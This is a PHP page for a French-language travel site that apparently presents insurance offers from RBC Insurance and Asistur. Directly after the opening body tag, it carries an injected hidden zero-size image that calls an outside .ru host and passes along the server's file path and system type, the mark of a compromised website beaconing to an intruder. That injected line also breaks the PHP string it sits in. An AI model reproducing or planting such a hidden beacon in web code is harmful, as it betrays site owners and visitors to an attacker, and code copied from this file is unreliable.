<?php
// @(#) $Id$
// +-----------------------------------------------------------------------+
// | Copyright (C) 2011, http://cosat.biz                                 |
// +-----------------------------------------------------------------------+
// | This file is free software; you can redistribute it and/or modify     |
// | it under the terms of the GNU General Public License as published by  |
// | the Free Software Foundation; either version 2 of the License, or     |
// | (at your option) any later version.                                   |
// | This file is distributed in the hope that it will be useful           |
// | but WITHOUT ANY WARRANTY; without even the implied warranty of        |
// | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the          |
// | GNU General Public License for more details.                          |
// +-----------------------------------------------------------------------+
// | Author: Denis Léveillé                                                          |
// +-----------------------------------------------------------------------+
//
include('lib/config.php');

echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=voyage' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='2' cellspacing='0' align='$Enligne' border='0' >
		<tr>
			<td>";

?>
  				<p align='center'><span> <font color='#D00E29' size='3' face='verdana'><b><?=$txt['Assurance']?></b></font></span> </p>
			</td>
		</tr>
		<tr>
			<td>
				<table width='<?=$Large?>' align='<?=$Enligne?>' border='2' cellpadding='2' cellspacing='2' >
					<tr>
						<td width='100%'>
							<br>
							<table width='100%' align='center'>
								<tr>
									<td>
										<img src='images/logo_rbc_insurance.gif'/>
									</td>
									<td>
										<b><big><?=$txt['Mess_Assurance_1']?></big></b>
									</td>
								</tr>
							</table>
							<br><br>
							<?=$txt['consulter_RBC']?><br/><br/>
							<a href='<?=$txt['url_1_RBC']?>' target='blank' ><?=$txt['Mess_url_1_RBC']?></a>
							<br><br>
							<?=$txt['Forfait_RBC']?><br/><br/>
							<a href='<?=$txt['url_2_RBC']?>' target='blank'><?=$txt['Mess_url_2_RBC']?></a>
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table width='<?=$Large?>' align='<?=$Enligne?>' border='2' cellpadding='2' cellspacing='2' >
					<tr>
						<td width='100%'>
							<br/>
							<table width='100%' align='center' cellpadding='2' cellspacing='2' >
								<tr>
									<td>
											<img src='images/logo-asistur.jpg'/>&nbsp;
									</td>
									<td>
										<b><big><?=$txt['Mess_Assurance_2']?></big></b>
									</td>	
								</tr>
							</table>
							<br/><br/><br/>
							<div align='right'><a href='assurances_asistur.php'><?=$txt['Mess_url_Asistur']?></a></div>
						</td>
					</tr>
				</table>

			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
	
<script language='JavaScript1.2'>
	function Rafraichie(){
			window.location.reload();
	} // Rafraichie
</script>
</body>
</html>	
		